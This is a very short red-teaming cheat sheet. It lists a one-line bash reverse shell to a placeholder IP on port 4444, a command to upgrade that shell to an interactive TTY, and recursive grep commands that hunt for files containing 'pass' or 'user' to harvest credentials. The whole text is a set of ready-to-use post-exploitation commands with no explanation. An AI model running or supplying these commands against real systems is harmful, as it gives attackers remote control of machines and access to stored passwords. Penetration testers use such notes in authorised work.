# useful 4red teaming

simplest reverse shell 
> bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'

upgrade to usable tty
> SHELL=/bin/bash script -q /dev/null

find all files with "pass"
> grep -i -R "pass" 2>/dev/null 
> egrep -i -R "pass|user" 2>/dev/null

